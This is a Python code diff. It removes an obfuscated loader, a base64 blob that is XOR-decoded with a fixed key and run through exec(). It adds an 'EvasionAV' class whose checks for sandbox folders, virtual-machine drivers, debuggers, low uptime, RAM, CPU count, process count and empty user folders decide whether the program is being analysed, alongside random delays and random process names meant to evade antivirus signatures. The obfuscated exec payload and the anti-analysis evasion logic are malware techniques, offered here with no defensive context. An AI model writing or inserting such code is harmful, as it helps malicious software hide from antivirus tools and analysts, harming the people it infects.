@@ -1,9 +1,164 @@
-import base64
-def _x(d,k):
-    r=[]
-    for i,c in enumerate(d):
-        r.append(chr(ord(c)^ord(k[i%len(k)])))
-    return ''.join(r)
-_k="86b2bec8942cbeb9"
-_c=base64.b64decode("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").decode()
-exec(_x(_c,_k))
+import os
+import sys
+import time
+import random
+import string
+import hashlib
+from datetime import datetime
+
+
+class EvasionAV:
+    def __init__(self):
+        self.es_seguro = True
+        self.checks_completados = 0
+        
+    def verificar_entorno(self):
+        checks = [
+            self._check_sandbox_files,
+            self._check_vm_artifacts,
+            self._check_debugger,
+            self._check_timing_attack,
+            self._check_process_count,
+            self._check_user_interaction,
+            self._check_system_uptime,
+            self._check_memory_size,
+            self._check_cpu_cores,
+            self._check_recent_files
+        ]
+        sospechoso = 0
+        for check in checks:
+            try:
+                if check():
+                    sospechoso += 1
+                self.checks_completados += 1
+            except:
+                pass
+            time.sleep(0.05)
+        if sospechoso >= 3:
+            self.es_seguro = False
+            return False
+        return True
+    
+    def _check_sandbox_files(self):
+        sandbox_files = [r'C:\\analysis', r'C:\\sandbox', r'C:\\cwsandbox', r'C:\\sample', r'C:\\virus']
+        for path in sandbox_files:
+            if os.path.exists(path):
+                return True
+        return False
+    
+    def _check_vm_artifacts(self):
+        vm_files = [
+            r'C:\\windows\\system32\\drivers\\vmmouse.sys',
+            r'C:\\windows\\system32\\drivers\\vmhgfs.sys',
+            r'C:\\windows\\system32\\drivers\\vboxmouse.sys',
+            r'C:\\windows\\system32\\vboxdisp.dll'
+        ]
+        for file in vm_files:
+            if os.path.exists(file):
+                return True
+        env_vars = ['VBOX', 'VMWARE', 'VIRTUAL', 'SANDBOX']
+        computer_name = os.environ.get('COMPUTERNAME', '').upper()
+        username = os.environ.get('USERNAME', '').upper()
+        for var in env_vars:
+            if var in computer_name or var in username:
+                return True
+        return False
+    
+    def _check_debugger(self):
+        try:
+            import ctypes
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                return True
+            start = time.perf_counter()
+            for i in range(10000):
+                _ = i * 2
+            elapsed = time.perf_counter() - start
+            if elapsed > 0.1:
+                return True
+        except:
+            pass
+        return False
+    
+    def _check_timing_attack(self):
+        operations = []
+        for _ in range(5):
+            start = time.perf_counter()
+            _ = hashlib.sha256(os.urandom(1024)).hexdigest()
+            elapsed = time.perf_counter() - start
+            operations.append(elapsed)
+        avg = sum(operations) / len(operations)
+        variance = sum((x - avg) ** 2 for x in operations) / len(operations)
+        return variance > 0.01
+    
+    def _check_process_count(self):
+        try:
+            import psutil
+            process_count = len(psutil.pids())
+            return process_count < 30
+        except:
+            return False
+    
+    def _check_user_interaction(self):
+        try:
+            recent_path = os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\\Windows\\Recent')
+            if os.path.exists(recent_path):
+                files = os.listdir(recent_path)
+                return len(files) < 5
+        except:
+            pass
+        return False
+    
+    def _check_system_uptime(self):
+        try:
+            import ctypes
+            uptime_ms = ctypes.windll.kernel32.GetTickCount64()
+            uptime_min = uptime_ms / 1000 / 60
+            return uptime_min < 10
+        except:
+            return False
+    
+    def _check_memory_size(self):
+        try:
+            import psutil
+            total_ram_gb = psutil.virtual_memory().total / (1024**3)
+            return total_ram_gb < 4
+        except:
+            return False
+    
+    def _check_cpu_cores(self):
+        try:
+            cores = os.cpu_count()
+            return cores < 2
+        except:
+            return False
+    
+    def _check_recent_files(self):
+        try:
+            downloads = os.path.join(os.path.expanduser('~'), 'Downloads')
+            if os.path.exists(downloads):
+                files = [f for f in os.listdir(downloads) if os.path.isfile(os.path.join(downloads, f))]
+                return len(files) < 3
+        except:
+            pass
+        return False
+    
+    def ofuscar_ejecucion(self):
+        time.sleep(random.uniform(0.5, 1.5))
+        for _ in range(random.randint(3, 8)):
+            _ = ''.join(random.choices(string.ascii_letters, k=10))
+            time.sleep(0.05)
+    
+    def evadir_firmas(self):
+        process_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.tmp'
+        timestamp = datetime.now().strftime('%Y%m%d%H%M%S%f')
+        unique_hash = hashlib.sha256(timestamp.encode() + os.urandom(32)).hexdigest()[:16]
+        return process_name, timestamp, unique_hash
+
+
+def verificar_seguridad_total():
+    evasion = EvasionAV()
+    evasion.ofuscar_ejecucion()
+    if not evasion.verificar_entorno():
+        return False
+    proceso, timestamp, unique_id = evasion.evadir_firmas()
+    return True
